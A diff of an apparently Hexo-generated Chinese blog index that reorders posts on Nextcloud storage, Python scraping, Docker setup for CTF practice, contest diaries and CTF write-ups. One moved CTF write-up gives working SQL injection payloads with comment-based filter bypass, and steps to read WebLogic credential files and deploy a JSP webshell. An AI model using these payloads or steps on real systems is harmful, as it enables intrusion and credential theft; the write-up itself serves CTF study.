+<li><p><a href="https://help.aliyun.com/document_detail/153892.html?spm=a2c4g.11186623.6.903.692e7a74lkBKbz">官方文档</a>有详细操作，先把bucket挂载到文件夹</p>
+</li>
+<li><p>在nextcloud开启externalstorage，在设置中外部存储选则挂载的位置<br><img src="https://img-blog.csdnimg.cn/d663518b1e624535a6095021f7006900.png" alt="在这里插入图片描述"></p>
+</li>
+</ol>
+<p> 宝塔可以直接识别，好爽</p>
+<p><img src="https://img-blog.csdnimg.cn/b1bc5b927f72461ca5c8acfafaa18a18.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>哎，我就是玩</category>
+      </categories>
+      <tags>
+        <tag>server</tag>
       </tags>
   </entry>
   <entry>
@@ -1583,24 +1626,6 @@ str + &#39; &#39; # 连接字符串
 ]]></content>
       <categories>
         <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python爬虫深入</title>
-    <url>/posts/3d5e7979/</url>
-    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
-
-<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
-<p>xpath语法</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>python学习</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -1668,6 +1693,52 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
+    <title>vm+kali+docker实现web题复现</title>
+    <url>/posts/c52439ad/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
+<li>vm</li>
+<li>kali</li>
+</ol>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br><span class="line"></span><br><span class="line">apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common</span><br><span class="line"></span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
+<p>docker version可查看是否安装成功</p>
+<h3 id="下载lamp镜像"><a href="#下载lamp镜像" class="headerlink" title="下载lamp镜像"></a>下载lamp镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search lamp 查找镜像</span><br><span class="line"></span><br><span class="line">docker pull mattrayner&#x2F;lamp 下载镜像</span><br><span class="line"></span><br><span class="line">docker images 查看镜像是否安装成功</span><br></pre></td></tr></table></figure>
+
+<h3 id="搭建题目"><a href="#搭建题目" class="headerlink" title="搭建题目"></a>搭建题目</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 100:80 -p 3307:3306 mattrayner&#x2F;lamp 创建lamp容器，并将docker 80和3306端口分别映射到虚拟机的100和3307端口</span><br><span class="line"></span><br><span class="line">docker ps -a 主要为了获得CONTAINER ID，查看当前运行的容器</span><br><span class="line"></span><br><span class="line">docker cp [题目目录] [CONTAINER ID]:&#x2F;var&#x2F;www&#x2F;html 将题目放到html文件夹</span><br><span class="line"></span><br><span class="line">docker stop [CONTAINER ID] 停止容器</span><br><span class="line"></span><br><span class="line">docker rm [CONTAINER ID] 删除容器</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行题目"><a href="#运行题目" class="headerlink" title="运行题目"></a>运行题目</h3><p>ifconfig获得kali ip，本机测试是否能ping通，在浏览器输入</p>
+<pre><code>http://[kali ip]:[映射端口]/[题目目录名]/
+e.g. http://192.168.xxx.xxx:100/ezyii/
+</code></pre>
+]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python爬虫深入</title>
+    <url>/posts/3d5e7979/</url>
+    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
+
+<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
+<p>xpath语法</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python学习</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一次爬虫实战</title>
     <url>/posts/5a85636c/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近迷上了python，各种花里胡哨的库也太好玩了。</p>
@@ -1730,7 +1801,7 @@ str + &#39; &#39; # 连接字符串
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#x69;&#x6b;&#97;&#101;&#x6b;&#x6b;&#x6b;&#x40;&#100;&#105;&#x6e;&#103;&#116;&#97;&#x6c;&#x6b;&#46;&#x63;&#111;&#x6d;">&#x69;&#x6b;&#97;&#101;&#x6b;&#x6b;&#x6b;&#x40;&#100;&#105;&#x6e;&#103;&#116;&#97;&#x6c;&#x6b;&#46;&#x63;&#111;&#x6d;</a></p>
+<p>邮箱： <a href="mailto:&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#x6b;&#x40;&#x64;&#105;&#110;&#103;&#x74;&#97;&#x6c;&#x6b;&#x2e;&#x63;&#111;&#x6d;">&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#x6b;&#x40;&#x64;&#105;&#110;&#103;&#x74;&#97;&#x6c;&#x6b;&#x2e;&#x63;&#111;&#x6d;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -1738,34 +1809,6 @@ str + &#39; &#39; # 连接字符串
       </categories>
       <tags>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vm+kali+docker实现web题复现</title>
-    <url>/posts/c52439ad/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
-<li>vm</li>
-<li>kali</li>
-</ol>
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br><span class="line"></span><br><span class="line">apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common</span><br><span class="line"></span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
-<p>docker version可查看是否安装成功</p>
-<h3 id="下载lamp镜像"><a href="#下载lamp镜像" class="headerlink" title="下载lamp镜像"></a>下载lamp镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search lamp 查找镜像</span><br><span class="line"></span><br><span class="line">docker pull mattrayner&#x2F;lamp 下载镜像</span><br><span class="line"></span><br><span class="line">docker images 查看镜像是否安装成功</span><br></pre></td></tr></table></figure>
-
-<h3 id="搭建题目"><a href="#搭建题目" class="headerlink" title="搭建题目"></a>搭建题目</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 100:80 -p 3307:3306 mattrayner&#x2F;lamp 创建lamp容器，并将docker 80和3306端口分别映射到虚拟机的100和3307端口</span><br><span class="line"></span><br><span class="line">docker ps -a 主要为了获得CONTAINER ID，查看当前运行的容器</span><br><span class="line"></span><br><span class="line">docker cp [题目目录] [CONTAINER ID]:&#x2F;var&#x2F;www&#x2F;html 将题目放到html文件夹</span><br><span class="line"></span><br><span class="line">docker stop [CONTAINER ID] 停止容器</span><br><span class="line"></span><br><span class="line">docker rm [CONTAINER ID] 删除容器</span><br></pre></td></tr></table></figure>
-
-<h3 id="运行题目"><a href="#运行题目" class="headerlink" title="运行题目"></a>运行题目</h3><p>ifconfig获得kali ip，本机测试是否能ping通，在浏览器输入</p>
-<pre><code>http://[kali ip]:[映射端口]/[题目目录名]/
-e.g. http://192.168.xxx.xxx:100/ezyii/
-</code></pre>
-]]></content>
-      <categories>
-        <category>开发工具</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1806,32 +1849,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>信息搜集</title>
-    <url>/posts/b21d488/</url>
-    <content><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p>
-<h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="admin密码"><a href="#admin密码" class="headerlink" title="/admin密码"></a>/admin密码</h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-php探针"><a href="#tz-php探针" class="headerlink" title="tz.php探针"></a>tz.php探针</h2><h2 id="cdn-绕过"><a href="#cdn-绕过" class="headerlink" title="cdn 绕过"></a>cdn 绕过</h2>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客主站点关闭通知</title>
-    <url>/posts/9fc12a02/</url>
-    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
-<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
-<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
-<p><strong>哎！马老师，发生什么事了？</strong></p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>初夏赛复盘</title>
     <url>/posts/63fc7f18/</url>
     <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql_inject"></a>sql_inject</h2><blockquote>
@@ -1863,38 +1880,35 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>反序列化总结</title>
-    <url>/posts/1e128b6c/</url>
-    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
-  </entry>
-  <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
+    <title>信息搜集</title>
+    <url>/posts/b21d488/</url>
+    <content><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p>
+<h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="admin密码"><a href="#admin密码" class="headerlink" title="/admin密码"></a>/admin密码</h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-php探针"><a href="#tz-php探针" class="headerlink" title="tz.php探针"></a>tz.php探针</h2><h2 id="cdn-绕过"><a href="#cdn-绕过" class="headerlink" title="cdn 绕过"></a>cdn 绕过</h2>]]></content>
       <categories>
         <category>ctf学习</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>博客主站点关闭通知</title>
+    <url>/posts/9fc12a02/</url>
+    <content><![CDATA[<p>受某种神秘力量的影响，从昨天早上开始，服务器cpu一直爆红，刚排除了一下是git的问题，重启也没用</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+<p>kill掉git的进程后，只要我重新push，cpu又会重新拉到100，原因我也不清楚，导致博客无法推送到服务器，现在已启用github上的备用博客，已将域名<a href="https://haorical.xyz/">https://haorical.xyz</a>解析到位于github上的博客地址<a href="https://haorical.github.io/">https://haorical.github.io</a>，可能会造成访问速度变慢等问题。</p>
+<p>服务器问题明天我再研究一下，现在服务器已经停了，包括运行的其他网站以及api接口暂时全部无法使用，我会尽快恢复。</p>
+<p><strong>哎！马老师，发生什么事了？</strong></p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>反序列化总结</title>
+    <url>/posts/1e128b6c/</url>
+    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
   </entry>
   <entry>
     <title>反弹shell测试</title>
@@ -1954,6 +1968,35 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>测试工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2097,26 +2140,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>蓝桥杯感想</title>
-    <url>/posts/c4930d9e/</url>
-    <content><![CDATA[<blockquote>
-<p>人在宿舍，刚下考场</p>
-</blockquote>
-<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>今年第一次参加，以后也不会参加了，还是专心打ctf好。<br>差不多一小时做题，三小时挂机。感觉全是搜索，的确是暴力杯，无奈一星期速成的算法功底，的确太拉了。考试前笔还被我摔坏了，全程脑子想。而且数据结构的题偏多，但我还没学，无奈用离散数学的知识做了做（打表）。</p>
-<h2 id="题目情况"><a href="#题目情况" class="headerlink" title="题目情况"></a>题目情况</h2><p>总体来说也就那样，感觉比去年难。</p>
-<p>前两道填空简简单单，第一个直接打表。</p>
-<p>第二个用set去重一直报bug，最后也不知道哪错了。</p>
-<p>第三个2个for循环，暴力就行，跑了大概1分钟出结果了。</p>
-<p>第四个找路径，搜了搜，没出结果。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>蓝桥杯</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>线性规划与整数线性规划</title>
     <url>/posts/dea132b6/</url>
     <content><![CDATA[<h1 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h1><blockquote>
@@ -2155,6 +2178,26 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>matlab</tag>
         <tag>数学建模</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>蓝桥杯感想</title>
+    <url>/posts/c4930d9e/</url>
+    <content><![CDATA[<blockquote>
+<p>人在宿舍，刚下考场</p>
+</blockquote>
+<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>今年第一次参加，以后也不会参加了，还是专心打ctf好。<br>差不多一小时做题，三小时挂机。感觉全是搜索，的确是暴力杯，无奈一星期速成的算法功底，的确太拉了。考试前笔还被我摔坏了，全程脑子想。而且数据结构的题偏多，但我还没学，无奈用离散数学的知识做了做（打表）。</p>
+<h2 id="题目情况"><a href="#题目情况" class="headerlink" title="题目情况"></a>题目情况</h2><p>总体来说也就那样，感觉比去年难。</p>
+<p>前两道填空简简单单，第一个直接打表。</p>
+<p>第二个用set去重一直报bug，最后也不知道哪错了。</p>
+<p>第三个2个for循环，暴力就行，跑了大概1分钟出结果了。</p>
+<p>第四个找路径，搜了搜，没出结果。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>蓝桥杯</tag>
       </tags>
   </entry>
   <entry>
